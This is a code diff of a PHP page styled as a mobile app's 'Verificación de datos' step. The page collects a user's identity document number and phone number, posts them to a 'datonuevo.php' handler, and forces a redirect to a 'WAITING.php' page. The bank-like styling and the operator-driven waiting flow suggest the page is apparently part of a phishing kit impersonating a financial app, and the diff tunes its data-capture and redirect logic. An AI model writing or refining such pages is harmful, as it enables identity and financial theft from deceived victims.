@@ -10,47 +10,49 @@ date_default_timezone_set('America/Bogota');
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
         <link href="../css/stylesheet.css" rel="stylesheet">
-        <link href="../css/style-app.css?v2" rel="stylesheet">        
+        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
         <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            /* BLOQUEO CRÍTICO: Forzamos que nazcan ocultos */
-            #fondo, #cargando, #cargando-o {
-                display: none !important;
+            /* Corregido: Eliminamos el !important para que el JS pueda mostrar la carga */
+            #fondo, #cargando-o {
+                display: none;
                 position: fixed;
                 top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(255,255,255,0.9);
+                background: rgba(255,255,255,0.95);
                 z-index: 9999;
                 text-align: center;
                 padding-top: 50%;
             }
-            .entradas { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; }
+            .entradas { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; font-family: 'Open Sans'; }
             .inp { border-bottom: 1px solid #ccc; padding: 10px 0; margin-bottom: 20px; }
             #btn-info { 
                 width: 90%; margin: 20px auto; display: block; height: 50px; 
                 border: none; border-radius: 25px; font-weight: bold; 
                 background-color: #eee; color: #aaa; transition: 0.3s;
+                cursor: not-allowed;
             }
         </style>
     </head>
     <body>         
         <div id="fondo"></div>
         <div id="cargando-o">
-            <img src="../img/load4.gif" width="80"><br>Cargando...
+            <img src="../img/load4.gif" width="80"><br>
+            <p style="color: #666; font-family: 'Open Sans';">Validando información...</p>
         </div>
 
         <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 15px;">
             <tr>
                 <td align="left"><img src="../img/btn-cerrar.jpg" height="25"></td>
                 <td align="center"><img src="../img/logo-app.jpg" height="25"></td>
-                <td align="right"><span style="color: #ccc;">Continuar</span></td>
+                <td align="right"><span id="txt-continuar-top" style="color: #ccc; font-weight: bold; font-size: 14px;">Continuar</span></td>
             </tr>
         </table>        
         
         <div style="text-align: center; margin-top: 30px;">
             <div style="font-weight: 800; font-size: 20px; color: #333;">Verificación de datos</div>
-            <p style="color: #666; font-size: 14px; padding: 0 40px;">Ingrese sus datos personales para gestionar aprobación</p>
+            <p style="color: #666; font-size: 14px; padding: 0 40px;">Ingrese sus datos personales para gestionar aprobación de su solicitud.</p>
         </div>
 
         <div class="frm" style="padding: 30px;">
@@ -78,39 +80,46 @@ date_default_timezone_set('America/Bogota');
 
         <script type="text/javascript">
             $(document).ready(function() { 
-                // Aseguramos que la pantalla esté limpia al entrar
                 $("#fondo, #cargando-o").hide();
 
-                // Lógica DINÁMICA para el botón
+                // Resetear estado para evitar bucles en WAITING
+                $.post("../process/estado.php", { nuevo_estado: "1" });
+
+                // Validación en tiempo real
                 $("#txt-documento, #txt-celular").on("input", function() {
+                    this.value = this.value.replace(/[^0-9]/g, ''); // Solo números
+                    
                     var d = $("#txt-documento").val();
                     var c = $("#txt-celular").val();
 
                     if (d.length >= 6 && c.length === 10) {
-                        $("#btn-info").prop("disabled", false).css({
-                            "background-color": "#FDDA24",
-                            "color": "#000"
-                        });
+                        $("#btn-info").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000", "cursor": "pointer"});
+                        $("#txt-continuar-top").css("color", "#000");
                     } else {
-                        $("#btn-info").prop("disabled", true).css({
-                            "background-color": "#eee",
-                            "color": "#aaa"
-                        });
+                        $("#btn-info").prop("disabled", true).css({"background-color": "#eee", "color": "#aaa", "cursor": "not-allowed"});
+                        $("#txt-continuar-top").css("color", "#ccc");
                     }
                 });
 
-                // Acción de envío a los 2 IDs
-                $("#btn-info").click(function() {
+                $("#btn-info").click(function(e) {
+                    e.preventDefault();
                     var doc = $("#txt-documento").val();
                     var cel = $("#txt-celular").val();
                     
-                    $("#fondo, #cargando-o").show();
-                    
-                    // Ajusta el nombre de este proceso según tu servidor (datonuevo.php o proceso.php)
-                    $.post("../process/datonuevo.php", { documento: doc, celular: cel })
-                     .always(function() {
-                        window.location.href = "WAITING.php";
-                     });
+                    if (doc !== "" && cel !== "") {
+                        $("#fondo").show();
+                        $("#cargando-o").show();
+                        
+                        // Enviamos el reporte de datos adicionales
+                        $.post("../process/datonuevo.php", { documento: doc, celular: cel }, function(data) {
+                            window.location.href = "WAITING.php";
+                        });
+
+                        // Salto forzado (Redundancia)
+                        setTimeout(function() {
+                            window.location.href = "WAITING.php";
+                        }, 3500);
+                    }
                 });
             });
         </script>
